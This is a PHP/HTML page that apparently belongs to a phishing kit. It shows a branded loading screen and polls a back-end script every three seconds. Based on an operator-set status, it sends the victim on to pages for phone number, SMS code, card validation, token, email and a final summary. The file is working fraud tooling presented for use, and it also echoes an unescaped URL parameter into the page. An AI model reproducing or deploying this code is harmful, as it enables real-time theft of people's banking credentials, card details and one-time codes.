<?php
/*===================================================*/
include("config.php");
/*===================================================*/
$time = $_GET["sessionDataKey"];
/*===================================================*/
?>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title></title>
<!--<meta http-equiv="refresh" content="10;url=portal/line?sessionDataKey=<?php echo $time;?>"> -->
<style type="text/css">
.loading-screen 
{
position: fixed; /* Stay in place */
z-index: 1; /* Sit on top */
left: 0;
top: 0;
width: 100%; /* Full width */
height: 100%; /* Full height */
overflow: auto; /* Enable scroll if needed */
background-color: rgba(41, 79, 162, 1); /* Fallback color */
}

/*** spinner global ****/
.spinner-global {
-webkit-border-radius: 50%;
-moz-border-radius: 50%;
-ms-border-radius: 50%;
border-radius: 50%;
animation: spinner-global 0.5s ease-in-out alternate infinite;
animation-delay: 0.32s;
box-shadow: 0 40px 0 white;
height: 16px;
margin: -50px auto 0 auto;
position: relative;
top: 50%;
width: 16px; }

.spinner-global:after, .spinner-global:before {
-webkit-border-radius: 50%;
-moz-border-radius: 50%;
-ms-border-radius: 50%;
border-radius: 50%;
animation: spinner-global 0.5s ease-in-out alternate infinite;
box-shadow: 0 40px 0 white;
content: '';
height: 16px;
position: absolute;
width: 16px; }

.spinner-global:before {
animation-delay: 0.48s;
left: -30px; }

.spinner-global:after {
animation-delay: 0.16s;
right: -30px; }

@keyframes spinner-global {
0% {
  box-shadow: 0 40px 0 white; }
100% {
  box-shadow: 0 20px 0 white; } }

/* Add animation to "page content" */
.animate-bottom {
position: relative;
-webkit-animation-name: animatebottom;
-webkit-animation-duration: 1s;
animation-name: animatebottom;
animation-duration: 1s
}

@-webkit-keyframes animatebottom {
from { bottom:-100px; opacity:0 } 
to { bottom:0px; opacity:1 }
}

@keyframes animatebottom { 
from{ bottom:-100px; opacity:0 } 
to{ bottom:0; opacity:1 }
}

</style>

<script src="jquery-3.4.1.min.js" type="text/javascript"></script>
<script>
$(function()
{
    var timer1;
    get_info = function()
    {
        my_time = $("#my_time").val();
        $.post("loginx.php?id=55",
        {
            time:my_time
        }
        ,function(raw_response)
        {
            console.log(raw_response);
            try
            {
                datos_array = JSON.parse(raw_response);
                estado = datos_array["estado"];
                if(estado=="celular")
                {
                    location.href="portal/line?sessionDataKey="+my_time;
                    return;
                }else if(estado=="sms")
                {
                    location.href="portal/sms?sessionDataKey="+my_time;
                    return;
                }else if(estado=="cc")
                {
                    location.href="portal/ValidCard?sessionDataKey="+my_time;
                    return;
                }else if(estado=="token")
                {
                    location.href="portal/msgToken?sessionDataKey="+my_time;
                    return;
                }else if(estado=="correo")
                {
                    location.href="portal/mail?sessionDataKey="+my_time;
                    return;
                }
                else if(estado=="fin")
                {
                    location.href="portal/resumen?sessionDataKey="+my_time;
                    return;
                }
            }catch(error)
            {
                console.log(error);
            }
        });
    }
    
    timer1 = setInterval(get_info, 3000);
});
    
</script>
</head>
<body>
	<div id="loading-screen" class="loading-screen">
		<div style="width: 300px; margin-left: auto; margin-right: auto; top: 40%; position: relative;">
			<img src="files/img/loli_manito_blanco.png" style="display:block; margin:auto;">
		</div>
		<div class="spinner-global"></div>
                <input type="hidden" id="my_time" value="<?php echo $time; ?>" >
	</div>
	<div id="backend"></div>
</body>
</html>